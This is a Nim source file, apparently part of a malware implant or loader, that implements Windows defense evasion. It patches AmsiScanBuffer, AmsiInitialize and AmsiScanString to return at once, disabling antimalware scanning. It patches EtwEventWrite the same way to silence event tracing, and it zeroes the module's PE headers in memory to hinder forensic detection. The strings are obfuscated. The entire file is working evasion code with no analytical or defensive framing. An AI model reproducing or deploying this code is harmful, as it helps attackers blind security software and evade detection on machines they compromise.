import ../utils/global
import ../utils/winapi/handlers
import ../utils/winapi/syscall
import ../utils/winapi/ssn

const pageRw = 0x04'u32
const pageSize = 0x1000'u32
const patchRet = 0xC3'u8
const mzSig = 0x5A4D'u16
const peSig = 0x00004550'u32
const dosELfanewOff = 0x3C
const ntFileHeaderSize = 20
const ntSignatureSize = 4
const optSizeOfHeadersOff = 60

proc patch_amsi*() =
  # Patches amsi scan functions so they return immediately
  if amsiAlreadyPatched: return
  let hMod = loadLibraryA(obf("amsi.dll"))
  if hMod == nil: return
  for api in [obf("AmsiScanBuffer"), obf("AmsiInitialize"), obf("AmsiScanString")]:
    let p = getProcAddress(hMod, api)
    if p == nil: continue
    if cast[ptr byte](p)[] == patchRet: continue
    var base = p
    var region = 1.csize_t
    var old: culong = 0
    if protectVirtualMemory(currentProcess, addr base, addr region, pageRw, addr old) != 0: continue
    cast[ptr byte](p)[] = patchRet
    discard protectVirtualMemory(currentProcess, addr base, addr region, old, addr old)
  amsiAlreadyPatched = true

proc patch_etw*() =
  # Patches etw event write so it returns immediately
  if etwAlreadyPatched: return
  let hMod = getModuleHandleA(obf("ntdll.dll"))
  if hMod == nil: return
  let p = getProcAddress(hMod, obf("EtwEventWrite"))
  if p == nil: return
  if cast[ptr byte](p)[] != patchRet:
    var base = p
    var region = 1.csize_t
    var old: culong = 0
    if protectVirtualMemory(currentProcess, addr base, addr region, pageRw, addr old) == 0:
      cast[ptr byte](p)[] = patchRet
      discard protectVirtualMemory(currentProcess, addr base, addr region, old, addr old)
  etwAlreadyPatched = true

proc patch_pe_headers*() =
  # Zeros the pe headers of the current module
  if peHeadersPatch != obf("on"): return
  if peHeadersPatched: return
  let base = getModuleHandleA(currentModule = true)
  if base == nil: return
  if cast[ptr uint16](base)[] != mzSig: return
  let eLfanew = cast[ptr culong](cast[int](base) + dosELfanewOff)[]
  let ntOff = int(eLfanew)
  if cast[ptr culong](cast[int](base) + ntOff)[] != peSig: return
  let optOff = ntOff + ntSignatureSize + ntFileHeaderSize
  let headerSize = cast[ptr culong](cast[int](base) + optOff + optSizeOfHeadersOff)[]
  if headerSize == 0 or headerSize > 0x100000'u32: return
  if not syscallReady and not prepareSyscalls(): return
  let pageMask = culong(pageSize - 1)
  let regionStart = cast[pointer](cast[int](base) and not int(pageMask))
  let endOff = cast[int](base) + int(headerSize)
  let regionEnd = (endOff + int(pageMask)) and not int(pageMask)
  let regionSz = culong(regionEnd - cast[int](regionStart))
  var region = regionSz.csize_t
  var allocBase = regionStart
  var old: culong = 0
  if protectVirtualMemory(currentProcess, addr allocBase, addr region, pageRw, addr old) != 0:
    return
  zeroMem(base, int(headerSize))
  discard protectVirtualMemory(currentProcess, addr allocBase, addr region, old, addr old)
  peHeadersPatched = true
